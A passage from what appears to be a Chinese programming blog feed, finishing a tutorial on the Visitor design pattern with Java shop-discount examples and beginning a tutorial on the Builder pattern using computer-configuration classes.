<span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Book</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Visitor visitor)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 下面这句话是访问者模式的关键，它将对Book的操作职责转移到了Visitor类</span></span><br><span class="line">        visitor.saleCountOnBook(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Book&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;price=&quot;</span> + price +</span><br><span class="line">                <span class="string">&quot;, page=&quot;</span> + page +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fruit</span> <span class="keyword">implements</span> <span class="title">Goods</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> weight;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> pricePerWeight;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getWeight</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> weight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setWeight</span><span class="params">(<span class="keyword">double</span> weight)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.weight = weight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPricePerWeight</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> pricePerWeight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPricePerWeight</span><span class="params">(<span class="keyword">double</span> pricePerWeight)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pricePerWeight = pricePerWeight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Fruit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Visitor visitor)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 同Book，操作职责转移</span></span><br><span class="line">        visitor.saleCountOnFruit(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Fruit&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;weight=&quot;</span> + weight +</span><br><span class="line">                <span class="string">&quot;, pricePerWeight=&quot;</span> + pricePerWeight +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>一定要注意Book在Fruit实现accept的操作，事实上所有的元素（这里就是每个具体的Goods）都应该做类似的实现，将操作这个元素的职责转移给Visitor。</strong></p><p>ok，再看看具体的Visitor是如何实现的。这里对<strong>上文“Visitor的方法为什么不依赖Goods高层抽象呢“一问题就做了解释。</strong></p><p>每种依赖的对象，内部结构可能是不同的，如Book有getPage方法，而Fruit有getPricePerWeight方法。<strong>访问者模式的使用要求之一是：对象结构内部元素固定（或尽可能固定）</strong>，这样Visitor的方法设计一开始就已经制定好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SaleCountVisitor</span> <span class="keyword">implements</span> <span class="title">Visitor</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> book</span></span><br><span class="line"><span class="comment">     * 对大于500页的书，打8折活动</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saleCountOnBook</span><span class="params">(Book book)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> price = book.getPrice();</span><br><span class="line">        <span class="keyword">if</span>(book.getPage() &gt;= <span class="number">500</span>)&#123;</span><br><span class="line">            price = price*<span class="number">0.8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        book.setPrice(price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 水果每买一斤，单位价格下降1%</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> fruit</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saleCountOnFruit</span><span class="params">(Fruit fruit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> weight = (<span class="keyword">int</span>) fruit.getWeight();</span><br><span class="line">        <span class="keyword">double</span> pricePerWeight = fruit.getPricePerWeight();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;weight;i++)&#123;</span><br><span class="line">            pricePerWeight*=<span class="number">0.99</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fruit.setPricePerWeight(pricePerWeight);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也许有人会书，那我就要依赖高层抽象，然后在内部做RTTI判断（也就是instanceof）后做类型强转，这其实也不是不可以，但是这样会违反<strong>单一职责原则</strong>，当操作过多时，你的方法会充斥着if else做RTTI判断。</p><p>Bukcet没什么好说的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bucket</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Goods[] goods;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Bucket</span><span class="params">(Goods[] goods)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.goods = goods;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saleCount</span><span class="params">(Visitor visitor)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(Goods goods: goods)&#123;</span><br><span class="line">            goods.accept(visitor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bucket&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;goods=&quot;</span> + Arrays.toString(goods) +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Client使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 定义商品</span></span><br><span class="line">        Book book = <span class="keyword">new</span> Book();</span><br><span class="line">        book.setPrice(<span class="number">100.0</span>);</span><br><span class="line">        book.setPage(<span class="number">600</span>);</span><br><span class="line">        book.setName(<span class="string">&quot;设计模式&quot;</span>);</span><br><span class="line">        Fruit fruit = <span class="keyword">new</span> Fruit();</span><br><span class="line">        fruit.setPricePerWeight(<span class="number">10</span>);</span><br><span class="line">        fruit.setName(<span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">        fruit.setWeight(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 装入篮中</span></span><br><span class="line">        Goods[] goods = <span class="keyword">new</span> Goods[]&#123;book,fruit&#125;;</span><br><span class="line">        Bucket bucket = <span class="keyword">new</span> Bucket(goods);  <span class="comment">// 其实bucket略有多余，不过不影响</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行打折</span></span><br><span class="line">        Visitor visitor = <span class="keyword">new</span> SaleCountVisitor();</span><br><span class="line">        bucket.saleCount(visitor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打折后商品信息</span></span><br><span class="line">        System.out.println(bucket);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bucket&#123;goods&#x3D;[Book&#123;price&#x3D;80.0, page&#x3D;600, name&#x3D;&#39;设计模式&#39;&#125;, Fruit&#123;weight&#x3D;5.0, pricePerWeight&#x3D;9.509900498999999, name&#x3D;&#39;苹果&#39;&#125;]&#125;</span><br></pre></td></tr></table></figure><p>访问者模式就是这样执行的，<strong>我个人看来其核心思想就是一种职责转移，将原本应该在具体商品类做的操作，委托到Visitor中执行。这样实现具体商品和逻辑操作的解耦，后续我们要添加任何操作，都和具体商品无关，我们只用定义操作类实现Visitor接口即可。</strong></p><h2 id="4-优缺点"><a href="#4-优缺点" class="headerlink" title="4.优缺点"></a>4.优缺点</h2><h2 id="4-1-优点"><a href="#4-1-优点" class="headerlink" title="4.1 优点"></a>4.1 优点</h2><ul><li>如果操作逻辑发生变化，那么我们只需要在访问者实现中进行更改，而不必在所有项目类中进行更改。(易维护性)</li><li>向系统添加新项目很容易，只需在访问者界面和实现中进行更改，现有项目类别将不会受到影响。（可扩展性）</li></ul><h2 id="4-2-缺点"><a href="#4-2-缺点" class="headerlink" title="4.2 缺点"></a>4.2 缺点</h2><ul><li>在设计时，我们应该知道visit（）方法的返回类型，否则我们将不得不更改接口及其所有实现。</li><li>如果访问者接口的实现过多，则很难扩展。</li></ul><h2 id="5-使用的注意事项"><a href="#5-使用的注意事项" class="headerlink" title="5.使用的注意事项"></a>5.使用的注意事项</h2><ul><li>确认当前<strong>层次结构（称为元素层次结构）将相当稳定</strong>，并且这些类的公共接口足以满足Visitor类所需要的访问。 如果不满足这些条件，则访问者模式则不太适用。</li><li>为每个Element派生类型都在<code>Visior</code>类中创建带有<code>visit（ElementXxx）</code>方法。<strong>（不要依赖高层抽象）</strong></li><li>在元素层次结构中添加一个“ accept（Visitor）”方法。 每个Element派生类中的实现都应该相同-<code>accept（Visitor v）&#123;v.visit（this）;  &#125;</code>。</li><li><code>Element</code>层次结构仅耦合到Visitor基类，但是<code>Visitor</code>层次结构耦合到每个<code>Element</code>派生类。 如果元素层次结构的稳定性低，而访客层次结构的稳定性高； 则<strong>应该考虑交换两个层次结构的“角色”。</strong></li><li>为要在<code>Element</code>对象上执行的<strong>每个“操作”创建</strong>一个<code>Visitor</code>派生类。  visit（）实现将依赖于<code>Element</code>的公共接口。.</li><li>客户端创建访问者对象，并通过调用<code>accept（）</code>将其传递给Element对象。</li></ul><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVmlzaXRvcl9wYXR0ZXJu" title="https://en.wikipedia.org/wiki/Visitor_pattern">Visitor pattern<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zb3VyY2VtYWtpbmcuY29tL2Rlc2lnbl9wYXR0ZXJucy92aXNpdG9y" title="https://sourcemaking.com/design_patterns/visitor">Visitor Design Pattern<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvdmlzaXRvci1kZXNpZ24tcGF0dGVybg==" title="https://www.geeksforgeeks.org/visitor-design-pattern">Visitor Design Pattern From Geek<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 访问者模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文透析构造者模式</title>
      <link href="/archives/58d5d9aa.html"/>
      <url>/archives/58d5d9aa.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>为了更好的构建软件，最近我也踏上了学习设计模式之路。学习来源主要是 <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMUc0NDExYzdONA==" title="https://www.bilibili.com/video/BV1G4411c7N4">韩老师的视频<i class="fa fa-external-link"></i></span>，但是韩老师的工厂模式和构造者模式讲得极差，于是又看了<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVF4NDExbzd0Tj9wPTI3" title="https://www.bilibili.com/video/BV1Qx411o7tN?p=27">蜗牛学院的课程<i class="fa fa-external-link"></i></span>,才对构建者模式有了较为深刻的理解。</p><p>私以为学习设计模式，绝不是知道一个案例，“背下”针对这个案例的解决方案和代码。设计模式更重要的是思想，从代码的历史角度去了解为何要使用这样的模式，才是正确的学习方式。</p><p>好了，废话了很多，现在开始讲解到底什么是建造者设计模式。</p><a id="more"></a><h2 id="1-问题导入"><a href="#1-问题导入" class="headerlink" title="1. 问题导入"></a>1. 问题导入</h2><p>需求：假设现有一客户需要购买电脑，电脑有高配、中配和低配之分。完成客户购买高配电脑的过程代码。</p><table><thead><tr><th align="center">型号</th><th align="center">cpu</th><th align="center">内存</th><th align="center">硬盘</th></tr></thead><tbody><tr><td align="center">高配</td><td align="center">i9-9900X</td><td align="center">16G</td><td align="center">512G固态</td></tr><tr><td align="center">中配</td><td align="center">i7-8700</td><td align="center">16G</td><td align="center">256G固态</td></tr><tr><td align="center">低配</td><td align="center">i3-8100</td><td align="center">8G</td><td align="center">128G固态</td></tr></tbody></table><p>嗯，问题非常的简单，先看看一种最简单的方法。</p><h3 id="1-1-方式一"><a href="#1-1-方式一" class="headerlink" title="1.1 方式一"></a>1.1 方式一</h3><p>我们直接定义一个Computer类，然后Client类直接new一个Computer即可。</p><p>Computer类，我们假设一个Computer最要由cpu，memory和hardDisk来决定性能。</p><p>先看类图：</p><p><img data-src="https://pic.downk.cc/item/5e81ed97504f4bcb044ee982.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Computer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String cpu;</span><br><span class="line">    <span class="keyword">private</span> String memory;</span><br><span class="line">    <span class="keyword">private</span> String hardDisk;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Computer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Computer</span><span class="params">(String cpu, String memory, String hardDisk)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cpu = cpu;</span><br><span class="line">        <span class="keyword">this</span>.memory = memory;</span><br><span class="line">        <span class="keyword">this</span>.hardDisk = hardDisk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Computer&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cpu=&#x27;&quot;</span> + cpu + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, memory=&#x27;&quot;</span> + memory + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, hardDisk=&#x27;&quot;</span> + hardDisk + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCpu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cpu;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCpu</span><span class="params">(String cpu)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cpu = cpu;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMemory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> memory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMemory</span><span class="params">(String memory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.memory = memory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHardDisk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hardDisk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHardDisk</span><span class="params">(String hardDisk)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.hardDisk = hardDisk;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再来看看Client是如何购购入的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Computer computer = <span class="keyword">new</span> Computer();</span><br><span class="line">        computer.setCpu(<span class="string">&quot;i9-9900X&quot;</span>);</span><br><span class="line">        computer.setMemory(<span class="string">&quot;16G&quot;</span>);</span><br><span class="line">        computer.setHardDisk(<span class="string">&quot;512G固态&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我想这也是大多数人的第一想法，因为这样的代码简单高效，但是缺点也非常的明显，我们每个client都需要自己手动地去set一个computer的所有属性，假设我们有成千上万的Client，那岂不是这段代码都要被写上成千上万次？</p><p>ok，相信很多人也能想到一种优化方式，“我把三种类型的（高、中、低配）的电脑封装好不就行了吗”？那我们再来看看吧：</p><h3 id="1-2-方式二"><a href="#1-2-方式二" class="headerlink" title="1.2  方式二"></a>1.2  方式二</h3><p><strong>友情提示：下面的方法还不是建造者模式。</strong></p><p>同样的，先看类图：</p><p><img data-src="https://pic.downk.cc/item/5e81edaa504f4bcb044ef799.png"></p><p>正如上面所分析的那样，我们写三个封装类就好了呀。如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HighComputerBuilder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Computer computer;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Computer <span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">        computer = <span class="keyword">new</span> Computer();</span><br><span class="line">        computer.setCpu(<span class="string">&quot;i9-9900X&quot;</span>);</span><br><span class="line">        computer.setMemory(<span class="string">&quot;16G&quot;</span>);</span><br><span class="line">        computer.setHardDisk(<span class="string">&quot;512G固态&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> computer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MediumComputerBuilder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Computer computer;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Computer <span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">        computer = <span class="keyword">new</span> Computer();</span><br><span class="line">        computer.setCpu(<span class="string">&quot;i7-8700&quot;</span>);</span><br><span class="line">        computer.setMemory(<span class="string">&quot;16G&quot;</span>);</span><br><span class="line">        computer.setHardDisk(<span class="string">&quot;256G固态&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> computer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LowComputerBuilder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Computer computer;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Computer <span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">        computer = <span class="keyword">new</span> Computer();</span><br><span class="line">        computer.setCpu(<span class="string">&quot;i3-8100&quot;</span>);</span><br><span class="line">        computer.setMemory(<span class="string">&quot;8G&quot;</span>);</span><br><span class="line">        computer.setHardDisk(<span class="string">&quot;128G&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> computer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将三种类型的Computer的建造都封装到类，这样客户在使用的时候并不需要了解高中低三种配置的具体组装过程。只用使用相应的Builder就能得到Computer了。如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HighComputerBuilder hc = <span class="keyword">new</span> HighComputerBuilder();</span><br><span class="line">        Computer computer = hc.build();</span><br><span class="line">        System.out.println(computer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就可以解决方式一中，如果出现多个client，我们需要多次写set方法，毕竟我们将三种类型的电脑的build过程给封装起来了。再次提醒，<strong>虽然我这里的封装类中带有Builder字样，但是这里还不是建造者模式。</strong></p><h4 id="1-2-1-方式二-改"><a href="#1-2-1-方式二-改" class="headerlink" title="1.2.1 方式二-改"></a>1.2.1 方式二-改</h4><p>方式二其实还有个小问题，那就是Client依赖了具体的封装类，如果你稍微学过一点设计模式，那你肯定听说<strong>过依赖倒转原则</strong>，Client应该尽量的去依赖高层抽象，而不是具体细节。听起来也许有点复杂，但是给个类图，我相信你马上就懂了。</p><p><img 